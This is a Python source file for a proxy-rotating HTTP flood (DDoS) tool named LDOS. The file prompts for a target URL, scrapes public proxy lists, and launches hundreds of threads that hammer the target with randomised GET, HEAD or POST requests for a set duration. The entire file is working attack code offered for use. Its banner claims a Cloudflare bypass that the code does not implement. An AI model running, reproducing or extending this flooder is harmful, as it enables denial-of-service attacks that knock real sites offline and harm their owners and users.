import requests
import socket
import socks
import time
import random
import threading
import sys
import ssl
import datetime
import os
from colorama import Fore
from urllib.parse import urlparse

red = Fore.RED
green = Fore.GREEN
reset = Fore.RESET
white = Fore.WHITE

print(fr'''
>---------------------------------------------<
|{red}       ___     ______   _______ _______     {reset} |
|{red}      |   |   |   _  \ |   _   |   _   |    {reset} |
|{red}      |.  |   |.  |   \|.  |   |   1___|    {reset} |
|{green}      |.  |___|.  |    |.  |   |____   |    {reset} |
|{green}      |:  1   |:  1    |:  1   |:  1   |    {reset} |
|{green}      |::.. . |::.. . /|::.. . |::.. . |    {reset} |
|{green}      `-------`------' `-------`-------'    {reset} |
>---------------------------------------------<
|        {red} Version: {white}1.0.0 (02.03.2025)  {reset}       |
|              {red} Coded by {white}Lunar  {reset}              |
>---------------------------------------------<
|                  {red} WARNING:              {reset}    |
| {white} We don't support attacks on: .edu hospital {reset}|
| {white}    websites volunteering for palestine and {reset}|
| {white}           ukraine or any other cause       {reset}|
>---------------------------------------------<
|                 New stuff:                  |
| {green}  [+] {red}Input using {white}input(){red} func  {reset}            |
| {green}  [+] {red}Cloudflare {white}Bypass & Capctha  {reset}         |
>---------------------------------------------<
|    {red}  Link: {white}https://github.com/Sakuzuna/-/  {reset} |
>---------------------------------------------<
''')

acceptall = [
    "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
    "Accept-Encoding: gzip, deflate\r\n",
    "Accept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
    "Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: iso-8859-1\r\nAccept-Encoding: gzip\r\n",
    "Accept: application/xml,application/xhtml+xml,text/html;q=0.9, text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n",
    "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n",
    "Accept: image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, application/x-shockwave-flash, application/msword, */*\r\nAccept-Language: en-US,en;q=0.5\r\n",
    "Accept: text/html, application/xhtml+xml, image/jxr, */*\r\nAccept-Encoding: gzip\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n",
    "Accept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/webp, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1\r\nAccept-Encoding: gzip\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n,",
    "Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\n",
    "Accept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n",
    "Accept: text/html, application/xhtml+xml",
    "Accept-Language: en-US,en;q=0.5\r\n",
    "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\n",
    "Accept: text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n",
]

referers = [
    "https://www.google.com/search?q=",
    "https://check-host.net/",
    "https://www.facebook.com/",
    "https://www.youtube.com/",
    "https://www.fbi.com/",
    "https://www.bing.com/search?q=",
    "https://r.search.yahoo.com/",
    "https://www.cia.gov/index.html",
    "https://vk.com/profile.php?redirect=",
    "https://www.usatoday.com/search/results?q=",
    "https://help.baidu.com/searchResult?keywords=",
    "https://steamcommunity.com/market/search?q=",
    "https://www.ted.com/search?q=",
    "https://play.google.com/store/search?q=",
    "https://www.qwant.com/search?q=",
    "https://soda.demo.socrata.com/resource/4tka-6guv.json?$q=",
    "https://www.google.ad/search?q=",
    "https://www.google.ae/search?q=",
    "https://www.google.com.af/search?q=",
    "https://www.google.com.ag/search?q=",
    "https://www.google.com.ai/search?q=",
    "https://www.google.al/search?q=",
    "https://www.google.am/search?q=",
    "https://www.google.co.ao/search?q=",
]

mode = "cc"
url = ""
proxy_ver = "5"
brute = False
out_file = "proxy.txt"
thread_num = 800
data = ""
cookies = ""

strings = "asdfghjklqwertyuiopZXCVBNMQWERTYUIOPASDFGHJKLzxcvbnm1234567890&"

Intn = random.randint
Choice = random.choice

def build_threads(mode, thread_num, event, proxy_type):
    if mode == "post":
        for _ in range(thread_num):
            th = threading.Thread(target=post, args=(event, proxy_type,))
            th.daemon = True
            th.start()
    elif mode == "cc":
        for _ in range(thread_num):
            th = threading.Thread(target=cc, args=(event, proxy_type,))
            th.daemon = True
            th.start()
    elif mode == "head":
        for _ in range(thread_num):
            th = threading.Thread(target=head, args=(event, proxy_type,))
            th.daemon = True
            th.start()

def getuseragent():
    platform = Choice(['Macintosh', 'Windows', 'X11'])
    if platform == 'Macintosh':
        os = Choice(['68K', 'PPC', 'Intel Mac OS X'])
    elif platform == 'Windows':
        os = Choice(['Win3.11', 'WinNT3.51', 'WinNT4.0', 'Windows NT 5.0', 'Windows NT 5.1', 'Windows NT 5.2', 'Windows NT 6.0', 'Windows NT 6.1', 'Windows NT 6.2', 'Win 9x 4.90', 'WindowsCE', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows NT 10.0; Win64; x64'])
    elif platform == 'X11':
        os = Choice(['Linux i686', 'Linux x86_64'])
    browser = Choice(['chrome', 'firefox', 'ie'])
    if browser == 'chrome':
        webkit = str(Intn(500, 599))
        version = str(Intn(0, 99)) + '.0' + str(Intn(0, 9999)) + '.' + str(Intn(0, 999))
        return 'Mozilla/5.0 (' + os + ') AppleWebKit/' + webkit + '.0 (KHTML, like Gecko) Chrome/' + version + ' Safari/' + webkit
    elif browser == 'firefox':
        currentYear = datetime.date.today().year
        year = str(Intn(2020, currentYear))
        month = Intn(1, 12)
        if month < 10:
            month = '0' + str(month)
        else:
            month = str(month)
        day = Intn(1, 30)
        if day < 10:
            day = '0' + str(day)
        else:
            day = str(day)
        gecko = year + month + day
        version = str(Intn(1, 72)) + '.0'
        return 'Mozilla/5.0 (' + os + '; rv:' + version + ') Gecko/' + gecko + ' Firefox/' + version
    elif browser == 'ie':
        version = str(Intn(1, 99)) + '.0'
        engine = str(Intn(1, 99)) + '.0'
        option = Choice([True, False])
        if option == True:
            token = Choice(['.NET CLR', 'SV1', 'Tablet PC', 'Win64; IA64', 'Win64; x64', 'WOW64']) + '; '
        else:
            token = ''
        return 'Mozilla/5.0 (compatible; MSIE ' + version + '; ' + os + '; ' + token + 'Trident/' + engine + ')'

def randomurl():
    return str(Intn(0, 271400281257))

def GenReqHeader(method):
    global data
    global target
    global path
    header = ""
    if method == "get" or method == "head":
        connection = "Connection: Keep-Alive\r\n"
        if cookies != "":
            connection += "Cookies: " + str(cookies) + "\r\n"
        accept = Choice(acceptall)
        referer = "Referer: " + Choice(referers) + target + path + "\r\n"
        useragent = "User-Agent: " + getuseragent() + "\r\n"
        header = referer + useragent + accept + connection + "\r\n"
    elif method == "post":
        post_host = "POST " + path + " HTTP/1.1\r\nHost: " + target + "\r\n"
        content = "Content-Type: application/x-www-form-urlencoded\r\nX-requested-with:XMLHttpRequest\r\n"
        refer = "Referer: http://" + target + path + "\r\n"
        user_agent = "User-Agent: " + getuseragent() + "\r\n"
        accept = Choice(acceptall)
        if data == "":  
            data = str(random._urandom(16))
        length = "Content-Length: " + str(len(data)) + " \r\nConnection: Keep-Alive\r\n"
        if cookies != "":
            length += "Cookies: " + str(cookies) + "\r\n"
        header = post_host + accept + refer + content + user_agent + length + "\n" + data + "\r\n\r\n"
    return header

def ParseUrl(original_url):
    global target
    global path
    global port
    global protocol
    original_url = original_url.strip()
    url = ""
    path = "/"  
    port = 80  
    protocol = "http"

    if original_url[:7] == "http://":
        url = original_url[7:]
    elif original_url[:8] == "https://":
        url = original_url[8:]
        protocol = "https"
    else:
        print(fr"{red}> That{reset} looks like not a correct url.")
        exit()
      
    tmp = url.split("/")
    website = tmp[0] 
    check = website.split(":")
    if len(check) != 1:  
        port = int(check[1])
    else:
        if protocol == "https":
            port = 443
    target = check[0]
    if len(tmp) > 1:
        path = url.replace(website, "", 1) 

def InputOption(question, options, default):
    ans = ""
    while ans == "":
        ans = str(input(question)).strip().lower()
        if ans == "":
            ans = default
        elif ans not in options:
            print(fr"{red}> Please{reset} enter the correct option")
            ans = ""
            continue
    return ans

def cc(event, proxy_type):
    header = GenReqHeader("get")
    proxy = Choice(proxies).strip().split(":")
    add = "?"
    if "?" in path:
        add = "&"
    event.wait()
    while True:
        s = None
        try:
            s = socks.socksocket()
            if proxy_type == 4:
                s.set_proxy(socks.SOCKS4, str(proxy[0]), int(proxy[1]))
            if proxy_type == 5:
                s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
            if proxy_type == 0:
                s.set_proxy(socks.HTTP, str(proxy[0]), int(proxy[1]))
            if brute:
                s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            s.settimeout(3)
            s.connect((str(target), int(port)))
            if protocol == "https":
                ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
                s = ctx.wrap_socket(s, server_hostname=target)
            try:
                for _ in range(100):
                    get_host = "GET " + path + add + randomurl() + " HTTP/1.1\r\nHost: " + target + "\r\n"
                    request = get_host + header
                    sent = s.send(str.encode(request))
                    if not sent:
                        proxy = Choice(proxies).strip().split(":")
                        break
                s.close()
            except Exception as e:
                if s:
                    s.close()
        except Exception as e:
            if s:
                s.close()

def head(event, proxy_type):
    header = GenReqHeader("head")
    proxy = Choice(proxies).strip().split(":")
    add = "?"
    if "?" in path:
        add = "&"
    event.wait()
    while True:
        try:
            s = socks.socksocket()
            if proxy_type == 4:
                s.set_proxy(socks.SOCKS4, str(proxy[0]), int(proxy[1]))
            if proxy_type == 5:
                s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
            if proxy_type == 0:
                s.set_proxy(socks.HTTP, str(proxy[0]), int(proxy[1]))
            if brute:
                s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            s.connect((str(target), int(port)))
            if protocol == "https":
                ctx = ssl.SSLContext()
                s = ctx.wrap_socket(s, server_hostname=target)
            try:
                for _ in range(100):
                    head_host = "HEAD " + path + add + randomurl() + " HTTP/1.1\r\nHost: " + target + "\r\n"
                    request = head_host + header
                    sent = s.send(str.encode(request))
                    if not sent:
                        proxy = Choice(proxies).strip().split(":")
                        break  
                s.close()
            except:
                s.close()
        except:  
            s.close()

def post(event, proxy_type):
    request = GenReqHeader("post")
    proxy = Choice(proxies).strip().split(":")
    event.wait()
    while True:
        try:
            s = socks.socksocket()
            if proxy_type == 4:
                s.set_proxy(socks.SOCKS4, str(proxy[0]), int(proxy[1]))
            if proxy_type == 5:
                s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
            if proxy_type == 0:
                s.set_proxy(socks.HTTP, str(proxy[0]), int(proxy[1]))
            if brute:
                s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            s.connect((str(target), int(port)))
            if protocol == "https":
                ctx = ssl.SSLContext()
                s = ctx.wrap_socket(s, server_hostname=target)
            try:
                for _ in range(100):
                    sent = s.send(str.encode(request))
                    if not sent:
                        proxy = Choice(proxies).strip().split(":")
                        break
                s.close()
            except:
                s.close()
        except:
            s.close()

def checking(lines, proxy_type, ms, rlock): 
    global nums
    global proxies
    proxy = lines.strip().split(":")
    if len(proxy) != 2:
        rlock.acquire()
        proxies.remove(lines)
        rlock.release()
        return
    err = 0
    while True:
        if err >= 3:
            rlock.acquire()
            proxies.remove(lines)
            rlock.release()
            break
        try:
            s = socks.socksocket()
            if proxy_type == 4:
                s.set_proxy(socks.SOCKS4, str(proxy[0]), int(proxy[1]))
            if proxy_type == 5:
                s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
            if proxy_type == 0:
                s.set_proxy(socks.HTTP, str(proxy[0]), int(proxy[1]))
            s.settimeout(ms)
            s.connect(("1.1.1.1", 80))
            sent = s.send(str.encode("GET / HTTP/1.1\r\n\r\n"))
            if not sent:
                err += 1
            s.close()
            break
        except:
            err += 1
    nums += 1

def check_socks(ms):  
    global nums
    thread_list = []
    rlock = threading.RLock()
    for lines in list(proxies):
        if proxy_ver == "5":
            th = threading.Thread(target=checking, args=(lines, 5, ms, rlock))
            th.start()
        if proxy_ver == "4":
            th = threading.Thread(target=checking, args=(lines, 4, ms, rlock))
            th.start()
        if proxy_ver == "http":
            th = threading.Thread(target=checking, args=(lines, 0, ms, rlock))
            th.start()
        thread_list.append(th)
        time.sleep(0.01)
        sys.stdout.write(fr"{red}> Checked{reset} " + str(nums) + " proxies\r")
        sys.stdout.flush()
    for th in list(thread_list):
        th.join()
        sys.stdout.write(fr"{red}> Checked{reset} " + str(nums) + " proxies\r")
        sys.stdout.flush()
    print(fr"\r\n{red}> Checked{reset} all proxies, Total Worked:" + str(len(proxies)))
    with open(out_file, 'wb') as fp:
        for lines in list(proxies):
            fp.write(bytes(lines, encoding='utf8'))
        fp.close()
    print(fr"{red}> They{reset} are saved in " + out_file)

def check_list(socks_file):
    print(fr"{red}> Checking{reset} list")
    temp = open(socks_file).readlines()
    temp_list = []
    for i in temp:
        if i not in temp_list:
            if ':' in i and '#' not in i:
                try:
                    socket.inet_pton(socket.AF_INET, i.strip().split(":")[0])  
                    temp_list.append(i)
                except:
                    pass
    rfile = open(socks_file, "wb")
    for i in list(temp_list):
        rfile.write(bytes(i, encoding='utf-8'))
    rfile.close()

def DownloadProxies(proxy_ver):
    if proxy_ver == "4":
        f = open(out_file, 'wb')
        socks4_api = [
            "https://api.proxyscrape.com/v2/?request=getproxies&protocol=socks4",
            "https://openproxylist.xyz/socks4.txt",
            "https://proxyspace.pro/socks4.txt",
            "https://raw.githubusercontent.com/B4RC0DE-TM/proxy-list/main/SOCKS4.txt",
            "https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-socks4.txt",
            "https://raw.githubusercontent.com/mmpx12/proxy-list/master/socks4.txt",
            "https://raw.githubusercontent.com/roosterkid/openproxylist/main/SOCKS4_RAW.txt",
            "https://raw.githubusercontent.com/saschazesiger/Free-Proxies/master/proxies/socks4.txt",
            "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/socks4.txt",
            "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks4.txt",
            "https://www.proxy-list.download/api/v1/get?type=socks4",
            "https://www.proxyscan.io/download?type=socks4",
            "https://api.proxyscrape.com/?request=displayproxies&proxytype=socks4&country=all",
            "https://api.openproxylist.xyz/socks4.txt",
        ]
        for api in socks4_api:
            try:
                r = requests.get(api, timeout=5)
                f.write(r.content)
            except:
                pass
        f.close()
        try:  
            r = requests.get("https://www.socks-proxy.net/", timeout=5)
            part = str(r.content)
            part = part.split("<tbody>")
            part = part[1].split("</tbody>")
            part = part[0].split("<tr><td>")
            proxies = ""
            for proxy in part:
                proxy = proxy.split("</td><td>")
                try:
                    proxies = proxies + proxy[0] + ":" + proxy[1] + "\n"
                except:
                    pass
                fd = open(out_file, "a")
                fd.write(proxies)
                fd.close()
        except:
            pass
    if proxy_ver == "5":
        f = open(out_file, 'wb')
        socks5_api = [
            "https://api.proxyscrape.com/v2/?request=getproxies&protocol=socks5&timeout=10000&country=all&simplified=true",
            "https://www.proxy-list.download/api/v1/get?type=socks5",
            "https://www.proxyscan.io/download?type=socks5",
            "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks5.txt",
            "https://raw.githubusercontent.com/hookzof/socks5_list/master/proxy.txt",
            "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/socks5.txt",
            "https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-socks5.txt",
            "https://api.openproxylist.xyz/socks5.txt",
            "https://api.proxyscrape.com/v2/?request=getproxies&protocol=socks5",
            "https://openproxylist.xyz/socks5.txt",
            "https://proxyspace.pro/socks5.txt",
            "https://raw.githubusercontent.com/B4RC0DE-TM/proxy-list/main/SOCKS5.txt",
            "https://raw.githubusercontent.com/manuGMG/proxy-365/main/SOCKS5.txt",
            "https://raw.githubusercontent.com/mmpx12/proxy-list/master/socks5.txt",
            "https://raw.githubusercontent.com/roosterkid/openproxylist/main/SOCKS5_RAW.txt",
            "https://raw.githubusercontent.com/saschazesiger/Free-Proxies/master/proxies/socks5.txt",
        ]
        for api in socks5_api:
            try:
                r = requests.get(api, timeout=5)
                f.write(r.content)
            except:
                pass
        f.close()
    if proxy_ver == "http":
        f = open(out_file, 'wb')
        http_api = [
            "https://api.proxyscrape.com/?request=displayproxies&proxytype=http",
            "https://www.proxy-list.download/api/v1/get?type=http",
            "https://www.proxyscan.io/download?type=http",
            "https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/http.txt",
            "https://api.openproxylist.xyz/http.txt",
            "https://raw.githubusercontent.com/shiftytr/proxy-list/master/proxy.txt",
            "http://alexa.lr2b.com/proxylist.txt",
            "https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-http.txt",
            "https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt",
            "https://raw.githubusercontent.com/sunny9577/proxy-scraper/master/proxies.txt",
            "https://raw.githubusercontent.com/opsxcq/proxy-list/master/list.txt",
            "https://proxy-spider.com/api/proxies.example.txt",
            "https://multiproxy.org/txt_all/proxy.txt",
            "https://raw.githubusercontent.com/roosterkid/openproxylist/main/HTTPS_RAW.txt",
            "https://raw.githubusercontent.com/UserR3X/proxy-list/main/online/http.txt",
            "https://raw.githubusercontent.com/UserR3X/proxy-list/main/online/https.txt",
            "https://api.proxyscrape.com/v2/?request=getproxies&protocol=http",
            "https://openproxylist.xyz/http.txt",
            "https://proxyspace.pro/http.txt",
            "https://proxyspace.pro/https.txt",
            "https://raw.githubusercontent.com/almroot/proxylist/master/list.txt",
            "https://raw.githubusercontent.com/aslisk/proxyhttps/main/https.txt",
            "https://raw.githubusercontent.com/B4RC0DE-TM/proxy-list/main/HTTP.txt",
            "https://raw.githubusercontent.com/hendrikbgr/Free-Proxy-Repo/master/proxy_list.txt",
            "https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-https.txt",
            "https://raw.githubusercontent.com/mertguvencli/http-proxy-list/main/proxy-list/data.txt",
            "https://raw.githubusercontent.com/mmpx12/proxy-list/master/http.txt",
            "https://raw.githubusercontent.com/mmpx12/proxy-list/master/https.txt",
            "https://raw.githubusercontent.com/proxy4parsing/proxy-list/main/http.txt",
            "https://raw.githubusercontent.com/RX4096/proxy-list/main/online/http.txt",
            "https://raw.githubusercontent.com/RX4096/proxy-list/main/online/https.txt",
            "https://raw.githubusercontent.com/saisuiu/uiu/main/free.txt",
            "https://raw.githubusercontent.com/saschazesiger/Free-Proxies/master/proxies/http.txt",
            "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt",
            "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/https.txt",
            "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
            "https://rootjazz.com/proxies/proxies.txt",
            "https://sheesh.rip/http.txt",
            "https://www.proxy-list.download/api/v1/get?type=https",
        ]
        for api in http_api:
            try:
                r = requests.get(api, timeout=5)
                f.write(r.content)
            except:
                pass
        f.close()
    print(fr"{red}> Have{reset} already downloaded proxies list as " + out_file)

def main():
    global proxy_ver
    global data
    global cookies
    global brute
    global url
    global out_file
    global thread_num
    global mode
    global target
    global proxies
    target = ""
    check_proxies = False
    download_socks = False
    proxy_type = 5
    period = 60
    help = False

    print(fr"{red}> Mode:{reset} [cc/post/head]")
    mode = input(fr"{red}> Enter{reset} mode (cc/post/head): ").strip().lower()
    if mode not in ["cc", "post", "head"]:
        print(fr"{red}> Invalid{reset} mode. Exiting.")
        return

    url = input(fr"{red}> Enter{reset} target URL: ").strip()
    ParseUrl(url)

    proxy_ver = input(fr"{red}> Enter{reset} proxy version (4/5/http, default:5): ").strip().lower()
    if proxy_ver not in ["4", "5", "http"]:
        proxy_ver = "5"

    brute = input(fr"{red}> Enable{reset} brute mode (1 for yes, 0 for no, default:0): ").strip()
    brute = brute == "1"

    thread_num = input(fr"{red}> Enter{reset} number of threads (default:800): ").strip()
    try:
        thread_num = int(thread_num) if thread_num else 800
    except:
        print(fr"{red}> Invalid{reset} number of threads. Using default 800.")
        thread_num = 800

    cookies = input(fr"{red}> Enter{reset} cookies (optional): ").strip()

    data_path = input(fr"{red}> Enter{reset} path to data file (optional, only for post mode): ").strip()
    if data_path and mode == "post":
        try:
            data = open(data_path, "r", encoding="utf-8", errors='ignore').readlines()
            data = ' '.join([str(txt) for txt in data])
        except:
            print(fr"{red}> Could{reset} not read data file. Proceeding without data.")

    out_file = input(fr"{red}> Enter{reset} proxies file name (default:proxy.txt): ").strip()
    if not out_file:
        out_file = "proxy.txt"

    download_socks = input(fr"{red}> Download{reset} proxies? (y/n, default:n): ").strip().lower() == "y"

    check_proxies = input(fr"{red}> Check{reset} proxies? (y/n, default:n): ").strip().lower() == "y"

    period = input(fr"{red}> Enter{reset} attack duration in seconds (default:60): ").strip()
    try:
        period = int(period) if period else 60
    except:
        print(fr"{red}> Invalid{reset} duration. Using default 60 seconds.")
        period = 60

    if download_socks:
        DownloadProxies(proxy_ver)

    if os.path.exists(out_file) != True:
        print(fr"{red}> Proxies{reset} file not found")
        return
    proxies = open(out_file).readlines()
    check_list(out_file)
    proxies = open(out_file).readlines()
    if len(proxies) == 0:
        print(fr"{red}> There{reset} are no more proxies. Please download a new proxies list.")
        return
    print(fr"{red}> Number{reset} Of Proxies: %d" % (len(proxies)))
    if check_proxies:
        check_socks(3)

    proxies = open(out_file).readlines()

    if target == "":
        print(fr"{red}> There{reset} is no target. End of process ")
        return

    event = threading.Event()
    print(fr"{red}-----------------------{reset}")
    print(fr"{red}> Building{reset} threads...")
    build_threads(mode, thread_num, event, proxy_type)
    event.clear()
    event.set()
    print("> Flooding...")
    time.sleep(period)

if __name__ == "__main__":
    main()
